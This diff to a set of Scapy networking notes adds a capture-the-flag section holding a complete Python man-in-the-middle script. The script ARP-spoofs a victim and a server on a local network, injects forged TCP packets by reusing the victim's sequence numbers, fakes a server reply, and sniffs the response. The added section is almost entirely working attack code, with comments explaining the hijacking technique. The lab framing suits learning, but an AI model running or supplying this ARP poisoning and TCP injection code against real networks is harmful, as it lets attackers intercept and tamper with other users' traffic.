@@ -652,3 +652,99 @@ ans, unans = traceroute("google.com")
 # TCP traceroute
 ans, unans = traceroute("google.com", l4=TCP())
 ```
+
+
+---
+# CTF
+- MITM: 10.0.0.2 - Attacker - 10.0.0.3  
+```python
+from scapy.all import *
+import threading, time
+
+iface = "eth0"
+victim_ip = "10.0.0.2"
+server_ip = "10.0.0.3"
+server_port = 31337
+
+attacker_mac = get_if_hwaddr(iface)
+print(f"[+] Attacker MAC: {attacker_mac}")
+
+def arp_spoof():
+    while True:
+        # Tell victim: "server IP is at attacker MAC"
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+              ARP(op=2, psrc=server_ip, pdst=victim_ip, hwsrc=attacker_mac),
+              iface=iface, verbose=0)
+
+        # Tell server: "victim IP is at attacker MAC"
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+              ARP(op=2, psrc=victim_ip, pdst=server_ip, hwsrc=attacker_mac),
+              iface=iface, verbose=0)
+        time.sleep(1.5)
+
+threading.Thread(target=arp_spoof, daemon=True).start()
+time.sleep(2)
+
+def packet_handler(pkt):
+    if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
+        return
+
+    ip, tcp = pkt[IP], pkt[TCP]
+    payload = pkt[Raw].load
+
+    # ===== Victim → Server traffic =====
+    if ip.src == victim_ip and ip.dst == server_ip and tcp.dport == server_port:
+
+        if payload.startswith(b"echo"):
+            print("[+] echo detected → injecting flag")
+
+            # IMPORTANT PART:
+            # seq  = tcp.seq
+            #   → reuse victim's current sequence number
+            #   → server thinks this packet continues the same TCP stream
+            #
+            # ack  = tcp.ack
+            #   → acknowledge everything the server has sent so far
+            #
+            # flags="PA"
+            #   → PSH + ACK = normal data packet
+            inject = IP(src=victim_ip, dst=server_ip) / \
+                     TCP(
+                         sport=tcp.sport,
+                         dport=server_port,
+                         seq=tcp.seq,        # critical for TCP injection
+                         ack=tcp.ack,        # must match server's seq
+                         flags="PA"
+                     ) / Raw(b"flag\n")
+
+            sendp(Ether() / inject, iface=iface, verbose=0)
+
+        elif b"Hello, World!" in payload:
+            # Fake server response (optional logic)
+            # seq = tcp.ack
+            #   → server starts sending from the next expected byte
+            #
+            # ack = tcp.seq + len(payload)
+            #   → acknowledge all bytes sent by victim
+            fake = IP(src=server_ip, dst=victim_ip) / \
+                   TCP(
+                       sport=server_port,
+                       dport=tcp.dport,
+                       seq=tcp.ack,
+                       ack=tcp.seq + len(payload),
+                       flags="PA"
+                   ) / Raw(b"Hello, World!")
+
+            sendp(Ether() / fake, iface=iface, verbose=0)
+
+    # ===== Server → Victim traffic =====
+    elif ip.src == server_ip and ip.dst == victim_ip and tcp.sport == server_port:
+        data = payload.decode(errors="ignore").strip()
+        print("\n" + "=" * 60)
+        print("FLAG:")
+        print(data)
+        print("=" * 60 + "\n")
+
+print(f"[+] Sniffing on {iface}")
+sniff(iface=iface, filter=f"tcp port {server_port}", prn=packet_handler, store=0)
+```
